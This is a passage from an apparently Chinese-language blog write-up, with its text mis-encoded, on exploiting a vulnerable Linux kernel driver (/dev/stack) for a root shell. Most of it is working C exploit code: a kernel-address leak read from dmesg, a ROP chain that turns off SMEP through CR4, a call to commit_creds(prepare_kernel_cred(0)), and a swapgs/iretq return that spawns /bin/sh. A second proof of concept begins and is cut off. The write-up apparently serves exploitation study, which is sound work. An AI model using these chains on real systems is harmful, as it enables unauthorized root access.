class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *(*<span class="title">prepare_kernel_cred_t</span>) (<span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">daemon</span>) __<span class="title">attribute__</span>((<span class="title">regparm</span>(3)));</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*<span class="keyword">commit_creds_t</span>)</span> <span class="params">(struct cred *<span class="keyword">new</span>)</span> __<span class="title">attribute__</span><span class="params">((regparm(<span class="number">3</span>)))</span></span>;</span><br><span class="line"><span class="keyword">prepare_kernel_cred_t</span>   prepare_kernel_cred;</span><br><span class="line"><span class="keyword">commit_creds_t</span>    commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_ss;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rflags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">findAddr</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> payload[<span class="number">300</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *p           = payload;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> memOffset;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    memOffset = findAddr();</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rax_rbx_r12_rbp_ret = memOffset - <span class="number">0xCB5B47</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> movCr4Rax_pop_rbp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x01020F1C</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x7AAE78</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x7AC289</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    addr[0x%llx]\n&quot;</span>, memOffset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set value for commit_creds and prepare_kernel_cred */</span></span><br><span class="line">    commit_creds        = (<span class="keyword">commit_creds_t</span>)(memOffset - <span class="number">0xfbf6a0</span>);</span><br><span class="line">    prepare_kernel_cred = (<span class="keyword">prepare_kernel_cred_t</span>)(memOffset - <span class="number">0xfbf2e0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* open fd on /dev/vuln 							*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open vuln device...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((fd = open(<span class="string">&quot;/dev/stack&quot;</span>, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Can&#x27;t open device file: /dev/stack\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* payload                          */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Construct the payload...\n&quot;</span>);</span><br><span class="line">    save_state();</span><br><span class="line">    <span class="comment">/* offset before RIP                    */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>,<span class="number">116</span>);</span><br><span class="line">    p+=<span class="number">116</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;\x42\x42\x42\x42\x42\x42\x42\x42&quot;</span>,<span class="number">8</span>);   <span class="comment">/* for rbp */</span></span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* pop rax;rbx;r12;rbp;ret                    */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;pop_rax_rbx_r12_rbp_ret,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    pop rax      at 0x%lx\n&quot;</span>, pop_rax_rbx_r12_rbp_ret);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;\xf0\x06\x00\x00\x00\x00\x00\x00&quot;</span>,<span class="number">8</span>);   <span class="comment">/* SMEP OFF */</span></span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>,<span class="number">8</span>);   <span class="comment">/* rbx*/</span></span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>,<span class="number">8</span>);   <span class="comment">/* r12 */</span></span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;\x42\x42\x42\x42\x42\x42\x42\x42&quot;</span>,<span class="number">8</span>);   <span class="comment">/* rbp */</span></span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* mov cr4, rax;rbp;ret     */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;movCr4Rax_pop_rbp,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    mov CR4, RAX at 0x%lx\n&quot;</span>, movCr4Rax_pop_rbp);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;\x42\x42\x42\x42\x42\x42\x42\x42&quot;</span>,<span class="number">8</span>);   <span class="comment">/* rbp */</span></span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* getroot                        */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;getR,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* swapgs;ret           */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    swapgs       at 0x%lx\n&quot;</span>, swapgs);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;swapgs,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* iretq                          */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    iretq        at 0x%lx\n&quot;</span>, iretq);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;iretq,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	the stack should look like this after an iretq call</span></span><br><span class="line"><span class="comment">	  RIP</span></span><br><span class="line"><span class="comment">	  CS</span></span><br><span class="line"><span class="comment">	  EFLAGS</span></span><br><span class="line"><span class="comment">	  RSP</span></span><br><span class="line"><span class="comment">	  SS</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* shell                          */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;sh,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* user_cs                        */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;user_cs,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="comment">/* user_rflags                    */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;user_rflags,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="comment">/*stack of userspace   			  */</span>         </span><br><span class="line">    <span class="function"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp <span class="title">asm</span><span class="params">(<span class="string">&quot;rsp&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)rsp;</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;sp,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="comment">/* user_ss                        */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;user_ss,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trig the vuln                  */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Trig the vulnerablity...\n&quot;</span>);</span><br><span class="line">    write(fd, payload, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">findAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">string</span>[] = <span class="string">&quot;Freeing SMP alternatives memory&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> found[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* execute dmesg and place result in a file */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Excecute dmesg...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/dmesg&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* find: Freeing SMP alternatives memory    */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Find usefull addr...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FILE* file = fopen(<span class="string">&quot;/tmp/dmesg&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), file)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="built_in">string</span>)) &#123;</span><br><span class="line">            <span class="built_in">strncpy</span>(found,line+<span class="number">53</span>,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(found,<span class="string">&quot;%p&quot;</span>,(<span class="keyword">void</span> **)&amp;addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(addr==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    dmesg error...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>     );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="æ–¹æ³•äºŒï¼š"   >
          <a href="#æ–¹æ³•äºŒï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h2>
      <p>ç›´æ¥åœ¨å†…æ ¸ç©ºé—´åˆ©ç”¨åœ°å€å’Œgadgetæ„é€ <code>commit_creds(prepare_kernel_cred(0))</code>æ¥å®Œæˆææƒï¼Œä¹‹åè¿”å›ç”¨æˆ·ç©ºé—´èµ·shellã€‚</p>

        <h3 id="1-ROPé“¾"   >
          <a href="#1-ROPé“¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ROPé“¾" class="headerlink" title="1.ROPé“¾"></a>1.ROPé“¾</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pop rdi;ret</span><br><span class="line">0</span><br><span class="line">prepare_kernel_cred_k</span><br><span class="line">pop rdx;rbx;rbp;ret</span><br><span class="line">pop rbp;ret</span><br><span class="line">0</span><br><span class="line">rbp_data</span><br><span class="line">mov rdi,rax;call rdx</span><br><span class="line">commit_creds_k</span><br><span class="line">swapgs;ret</span><br><span class="line">iretq </span><br></pre></td></tr></table></div></figure>

<p>ä¹‹åå°±æ˜¯è¿”å›ç”¨æˆ·ç©ºé—´èµ·shelläº†</p>

        <h3 id="2-è§£ææ‰§è¡Œæµç¨‹"   >
          <a href="#2-è§£ææ‰§è¡Œæµç¨‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è§£ææ‰§è¡Œæµç¨‹" class="headerlink" title="2.è§£ææ‰§è¡Œæµç¨‹"></a>2.è§£ææ‰§è¡Œæµç¨‹</h3>
      <p>â–²å…ˆæ˜¯è°ƒç”¨<code>prepare_kernel_cred_k(0)</code>ï¼Œç„¶åé€šè¿‡å°†<code>pop rbp;ret</code>èµ‹å€¼ç»™rdxï¼Œä¹‹å<code>mov rdi,rax</code>ï¼Œç„¶åcall rdxï¼Œå³è°ƒç”¨<code>pop rbp;ret</code>ï¼Œä¹‹åretå³å¯å›åˆ°<code>commit_creds_k</code>ã€‚</p>
<p>è¿™é‡Œè¾ƒä¸ºéº»çƒ¦çš„åŸå› æ˜¯å› ä¸º<code>mov rdi,rax;call rdx</code>è¿™ä¸ªè¯­å¥ï¼Œéœ€è¦èµ‹å€¼rdiæ‰èƒ½è¿›è¡Œ<code>commit_creds</code>å‡½æ•°çš„æ‰§è¡Œï¼Œå³å°†<code>prepare_kernel_cred_k(0)</code>è¿”å›å€¼ç»™<code>commit_creds</code>å‡½æ•°ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200208.png" alt="Snipaste_2021-09-30_19-56-10"></p>
<p>èµ‹å€¼</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200230.png" alt="Snipaste_2021-09-30_19-57-47"></p>
<p>ä¹‹ååˆå› ä¸ºå­˜åœ¨callè¿™ä¸ªè¯­å¥ï¼Œæ‰€ä»¥å¤šäº†<code>pop rbp;ret</code>æ¥å°†æ ˆå¹³è¡¡æ‰ï¼Œï¼Œä»è€Œèƒ½å¤Ÿç›´æ¥retåˆ°commit_creds</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200353.png" alt="Snipaste_2021-09-30_20-03-46"></p>
<p>åŒæ ·ha1vkå¸ˆå‚…çš„åˆ©ç”¨jmpå°±æ¯”è¾ƒç®€å•ï¼Œä¸è¿‡å…·ä½“çœ‹gadgetï¼Œæœ‰æ—¶å€™å¾ˆéš¾æ‰¾ã€‚</p>

        <h3 id="poc-1"   >
          <a href="#poc-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_ss;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rflags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">findAddr</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> payload[<span class="number">300</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *p           = payload;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> memOffset;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    memOffset = findAddr();</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = memOffset - <span class="number">0xD17AF3</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdx_rbx_rbp_ret = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0xCB43CD</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rbp_ret = memOffset - <span class="number">0xCB43CB</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> movRdiRax_call_rdx = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0xF8F3AA</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred_k = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0xFBF2E0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds_k = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0xFBF6A0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x7AAE78</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x7AC289</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    addr[0x%llx]\n&quot;</span>, memOffset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* open fd on /dev/vuln 							*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open vuln device...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((fd = open(<span 